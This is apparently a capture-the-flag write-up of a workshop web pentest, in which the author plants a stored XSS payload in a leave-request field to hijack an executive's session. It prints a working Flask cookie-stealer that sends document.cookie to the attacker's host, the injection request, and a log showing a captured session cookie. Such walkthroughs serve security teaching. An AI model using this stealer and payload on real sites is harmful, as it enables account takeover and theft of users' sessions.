# Web Application Pentest 4 - Business Excellence

We need to gain access to the CVO (Angelina’s) account. In order to do this, we most likely will need to steal a cookie. We take a look in the leave details section and put in a leave request to see if it’s XSS protected. Additionally, we notice that the session cookie on this website is not HTTPOnly. Time to steal.

The browser will prevent javascript accessing HTTPOnly cookies, hence, if it was HTTP Only, we would be looking in the wrong place.

We do the naive thing and just put <h1>Hello</h1> in. However, the ticker spits out WARNING: XSS detected! You have been reported.. Additionally, it appears the XSS is stripped client side too.

Lets take this to a PostMan session rather than mucking around with request stripping.

We also fire up a little flask web-app to steal the user’s session.

```
from flask import Flask
import sys
app = Flask(__name__)

if len(sys.argv) < 3:
    print("Usage: {} <Listen IP Address> <Listen Port>".format(sys.argv[0]))
    print("Listen IP Must be a reachable machine IP from the box")
    exit(1)

host = sys.argv[1]; port = int(sys.argv[2])

@app.route('/')
def hello_world():
    return 'Hello World! <script src="http://{}:{}/r.js"></script>'.format(host,port)

@app.route('/r.js')
def steal():
    return """
    var url = 'http://{}:{}/url?'+ document.cookie;
    document.write('<img src="' + url +'" />');
    """.format(host, port)

if __name__ == '__main__':
    app.run(debug=True, port=port, host='0.0.0.0')
```

We send off the following request:

```
POST /service/leave HTTP/1.1
Host: www.workshop.vats.ninja
Cache-Control: no-cache

start: 11/19/2015
end: 12/19/2015
reason: <Script src="http://x.x.x.x/r.js"></Script>
```

(Replacing x.x.x.x my your machine’s accessible IP address)

We notice that the ticker says “WARNING: XSS detected! You have been reported.” however, we still wait. Within 2 minutes, our javascript gets loaded, and we’ve stolen the user’s session cookie:

```
192.168.8.6 - - [19/Nov/2015 17:58:01] "GET /r.js HTTP/1.1" 200 -
192.168.8.6 - - [19/Nov/2015 17:58:01] "GET /url?session=eyJfZnJlc2giOnRydWUsIl9pZCI6eyIgYiI6IlltSmtNemxpT1RCbE56TTJNakkwTkRVMU0yTXpPVFZpTkRoa01tWm1Zek09In0sInVzZXJfaWQiOiI1In0.CS8EeQ.fNfERZulfSlUGpMSNEnsN2TBnzQ HTTP/1.1" 404 -
```

We replace our session cookie with this one, and now we’ve logged in, reavealing the flag in the ticker:

> You’re an Executive! - {}
